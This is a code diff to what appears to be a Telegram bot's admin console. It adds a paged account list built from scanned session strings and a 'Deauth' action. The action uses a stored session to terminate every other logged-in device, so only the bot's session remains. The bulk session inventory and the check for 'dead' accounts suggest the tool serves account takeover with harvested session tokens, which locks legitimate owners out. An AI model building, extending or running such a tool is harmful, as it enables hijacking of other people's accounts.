@@ -273,30 +273,12 @@ async def admin_text(client, message):
         return
 
     if text == ABTN_DEAUTH:
-        WAITING[uid] = "deauth_session"
-        await reply_premium(
-            message,
-            "🔒 **Deauth**\nSend the **session string** of the account.\n"
-            "The bot will log out every OTHER device while keeping its own login.",
-            reply_markup=cancel_keyboard(),
-        )
-        return
-
-    # ---- awaiting input ----
-    if WAITING.get(uid) == "deauth_session":
         WAITING.pop(uid, None)
-        status = await message.reply_text("🔒 Connecting and terminating other sessions...")
-        res = await deauth_all_others(text)
-        if res["ok"]:
-            await safe_edit_text(
-                status,
-                f"✅ **Deauth done** for `{res['username']}`\n"
-                f"Terminated **{res['terminated']}** other session(s).\n"
-                f"The bot's own session stays valid.",
-            )
-        else:
-            await safe_edit_text(status, f"❌ **Deauth failed:** `{res['error']}`")
-        await send_premium(uid, "Back to console.", reply_markup=get_admin_keyboard())
+        if not SCAN["scanned"]:
+            await reply_premium(message, "Run **🔄 Scan Sessions** first, then pick an account to deauth.", reply_markup=get_admin_keyboard())
+            return
+        body, kb = build_list_view("all", _filtered("all"), 1, mode="deauth")
+        await reply_premium(message, body, reply_markup=kb)
         return
 
 
@@ -328,6 +310,37 @@ async def admin_callback(client, callback_query):
         body, kb = build_list_view(cat, _filtered(cat), page)
         await safe_edit_text(callback_query.message, body, reply_markup=kb)
         await callback_query.answer()
+        return
+
+    if action == "dpg":
+        cat, page = parts[2], int(parts[3])
+        body, kb = build_list_view(cat, _filtered(cat), page, mode="deauth")
+        await safe_edit_text(callback_query.message, body, reply_markup=kb)
+        await callback_query.answer()
+        return
+
+    if action == "done":
+        cat, pos = parts[2], int(parts[3])
+        items = _filtered(cat)
+        if not (0 <= pos < len(items)):
+            await callback_query.answer("Not found.", show_alert=True)
+            return
+        acc = items[pos]
+        if not acc.get("ok"):
+            await callback_query.answer("Account is dead — cannot deauth.", show_alert=True)
+            return
+        await callback_query.answer("Deauthing...")
+        status = await send_premium(uid, f"🔒 Terminating other sessions for `{account_label(acc)}`...")
+        res = await deauth_all_others(acc["session"])
+        if res["ok"]:
+            await safe_edit_text(
+                status,
+                f"✅ **Deauth done** for `{res['username'] or account_label(acc)}`\n"
+                f"Terminated **{res['terminated']}** other session(s).\n"
+                f"Only this account's session remains logged in.",
+            )
+        else:
+            await safe_edit_text(status, f"❌ **Deauth failed:** `{res['error']}`")
         return
 
     if action == "one":
